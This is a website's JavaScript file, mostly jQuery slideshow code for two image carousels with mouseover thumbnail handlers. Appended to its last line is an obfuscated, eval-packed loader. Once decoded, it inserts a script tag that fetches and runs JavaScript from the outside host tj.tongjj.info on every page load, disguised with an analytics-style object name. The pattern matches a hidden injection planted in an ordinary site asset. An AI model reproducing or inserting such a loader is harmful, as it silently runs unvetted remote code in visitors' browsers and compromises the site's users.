function chehch() { function h() { n(c), b.autoplay == !0 && l(b.duration) } function i() { c++, c >= e && (c = 0), selectLayer1(c + 1), m(c, !0) } function j() { c--, c < 0 && (c = e - 1), m(c, !1) } function k(a) { g.src = "yt" + (a + 1) + ".jpg", c = a, m(c, !1) } function l(a) { $("#slidesContainer").animate({ optical: 1 }, 5e3, "", function () { i() }) } function m(a, c) { $("#slideInner").stop(), c == !1 || b.autoplay == !1 || a != 0 ? $("#slideInner").animate({ marginLeft: b.slideWidth * -a }, "", "", function () { n(a), b.autoplay == !0 && l(b.duration) }) : $("#slideInner").animate({ marginLeft: b.slideWidth * -e }, "", "", function () { $("#slideInner").css("marginLeft", 0), n(a), b.autoplay == !0 && l(b.duration) }) } function n(a) { a == 0 ? $("#leftControl").show() : $("#leftControl").show(), a == e - 1 ? $("#rightControl").show() : $("#rightControl").show(), b.showSlideIndex == !0 && ($(".numbers").removeClass("active"), $("#slide-" + (a + 1)).addClass("active")) } var a = $(this), b = options, c = 0, d = $(".slide"), e = d.length; $("#slidesContainer").css("overflow", "hidden"), d.wrapAll('<div id="slideInner"></div>').css({ "float": "left", width: b.slideWidth }), $(".slide:first").clone().appendTo("#slideInner"), $("#slideInner").css("width", b.slideWidth * (e + 1)); if (b.showSlideIndex == !0) { a.append('<div id="slideIndex"></div>'); for (var f = 1; f <= e; f++) $("#slideIndex").append('<span id="slide-' + f + '" class="numbers">' + f + "</span>"); $(".numbers").click(function () { k($(this).attr("id").replace("slide-", "") - 1, !1) }) } $("#cimg_1").mouseover(function () { k(0), selectLayer1(1) }), $("#cimg_2").mouseover(function () { k(1), selectLayer1(2) }), $("#cimg_3").mouseover(function () { k(2), selectLayer1(3) }), $("#cimg_4").mouseover(function () { k(3), selectLayer1(4) }), $("#cimg_5").mouseover(function () { k(4), selectLayer1(5) }); var g = $("#pro_list"); h() } function selectLayer1(a) { switch (a) { case 1: document.getElementById("pro_list").src = "img/yt1.gif", document.getElementById("cimg_1").src = "img/mouseover.gif", document.getElementById("cimg_2").src = "img/mouseout.gif", document.getElementById("cimg_3").src = "img/mouseout.gif", document.getElementById("cimg_4").src = "img/mouseout.gif", document.getElementById("cimg_5").src = "img/mouseout.gif"; break; case 2: document.getElementById("pro_list").src = "img/yt2.gif", document.getElementById("cimg_2").src = "img/mouseover.gif", document.getElementById("cimg_1").src = "img/mouseout.gif", document.getElementById("cimg_3").src = "img/mouseout.gif", document.getElementById("cimg_4").src = "img/mouseout.gif", document.getElementById("cimg_5").src = "img/mouseout.gif"; break; case 3: document.getElementById("pro_list").src = "img/yt3.gif", document.getElementById("cimg_3").src = "img/mouseover.gif", document.getElementById("cimg_2").src = "img/mouseout.gif", document.getElementById("cimg_1").src = "img/mouseout.gif", document.getElementById("cimg_4").src = "img/mouseout.gif", document.getElementById("cimg_5").src = "img/mouseout.gif"; break; case 4: document.getElementById("pro_list").src = "img/yt4.gif", document.getElementById("cimg_4").src = "img/mouseover.gif", document.getElementById("cimg_2").src = "img/mouseout.gif", document.getElementById("cimg_3").src = "img/mouseout.gif", document.getElementById("cimg_1").src = "img/mouseout.gif", document.getElementById("cimg_5").src = "img/mouseout.gif", !function () { } (); break; case 5: document.getElementById("pro_list").src = "img/yt5.gif", document.getElementById("cimg_5").src = "img/mouseover.gif", document.getElementById("cimg_2").src = "img/mouseout.gif", document.getElementById("cimg_3").src = "img/mouseout.gif", document.getElementById("cimg_4").src = "img/mouseout.gif", document.getElementById("cimg_1").src = "img/mouseout.gif", !function () { } () } } var defaults = { slideWidth: 580, autoplay: !0, duration: 15e3, showSlideIndex: !1 }, options = $.extend(defaults, options), slideshow = $(this), o = options, currentPosition = 0, slides = $(".slide"), numberOfSlides = slides.length


function statrInfo() {
    chehch();rNva();
}

 
var defaultsxc = {
    slideWidthxc: 320,
    autoplayxc: true,
    durationxc: 9000,
    showSlideIndexxc: false
}; var options = $.extend(defaultsxc, options);
function rNva() {  var slideshow = $(this);var o = options; var currentPosition = 0;var slides = $('.slidexc'); var numberOfSlides = slides.length; $('#slidesContainerxc').css('overflow', 'hidden');  slides.wrapAll('<div id="slideInnerxc"></div>')
.css({ 'float': 'left', 'width': o.slideWidthxc}); $('.slidexc:first').clone().appendTo('#slideInnerxc');$('#slideInnerxc').css('width', o.slideWidthxc * (numberOfSlides + 1));
 if (o.showSlideIndexxc == true) { slideshow.append('<div id="slideIndexxc"></div>');for (var i = 1; i <= numberOfSlides; i++) {$('#slideIndexxc').append('<span id="slide-' + i + 'xc" class="numbersxc">' + i + '</span>'); }$('.numbersxcxc').click(function () { goto(($(this).attr('id')).replace('slide-', '') - 1, false) });   }
                          
    $('#ny1').mouseover(function () { goto(0); CHENCbeijing(1); }); $('#ny2').mouseover(function () { goto(1); CHENCbeijing(2); }); $('#ny3').mouseover(function () { goto(2); CHENCbeijing(3); });init(); function init() {manageControls(currentPosition); if (o.autoplayxc == true) setNextTimeOut(o.durationxc); }  function next() {
        currentPosition++;  if (currentPosition >= numberOfSlides) currentPosition = 0;
		                        
		
		CHENCbeijing(currentPosition + 1); slideTo(currentPosition, false);  } function prev() {
        currentPosition--;  if (currentPosition < 0) currentPosition = numberOfSlides - 1;  slideTo(currentPosition, false);  }  function goto(position) {
        currentPosition = position;  slideTo(currentPosition, false);    }  function setNextTimeOut(time) {
        $('#slidesContainerxc').animate({ optical: 1 }, 5000, '', function () { next(); });
    }   function slideTo(position, continuously) {
        $('#slideInnerxc').stop();  if (continuously == false || o.autoplayxc == false || position != 0) {
            $('#slideInnerxc').animate({ 'marginLeft': o.slideWidthxc * (-position) }, '', '',
		 function () {
						    manageControls(position);
						    if (o.autoplayxc == true) setNextTimeOut(o.durationxc); } )  }   else {    $('#slideInnerxc').animate({ 'marginLeftxc': o.slideWidthxc * (-numberOfSlides) }, '', '', function () {  $('#slideInnerxc').css('marginLeft', 0);
						    manageControls(position)
						    if (o.autoplayxc == true) setNextTimeOut(o.durationxc); } )  } }
 
    function manageControls(position) {  if (position == 0) { $('#leftControlxc').show() } else { $('#leftControlxc').show() };   if (position == (numberOfSlides - 1)) { $('#rightControlxc').show() } else { $('#rightControlxc').show() }; if (o.showSlideIndexxc == true) { 
 $('.numbersxc').removeClass("activexc");  $('#slide-' + (position + 1) + 'xc').addClass("activexc"); }  } }

function CHENCbeijing(tempi) {
    for (var i = 1; i < 4; i++) {
        if (i == tempi) {
            document.getElementById("ny" + i).src = "img/mouseover.gif";
        }
        else {
            document.getElementById("ny" + i).src = "img/mouseout.gif";
        }
    }
    document.getElementById("nyh1").src = "img/ny" + tempi + ".gif";
}eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7 3(e,t,n,a,o,i,m){e.5=o,e[o]=e[o]||3(){(e[o].q=e[o].q||[]).b(p)},e[o].l=e[o].l||+6 4,i=t.8(n),i.9=1,i.c=a,m=t.d(n)[0],m.f.g(i,m)}(h,j,"k","//2.r.s/2/1.u","2");',31,31,'||tj|function|Date|alogObjectName|new|void|createElement|asyn||push|src|getElementsByTagName||parentNode|insertBefore|window||document|script|||||arguments||tongjj|info||js'.split('|'),0,{}))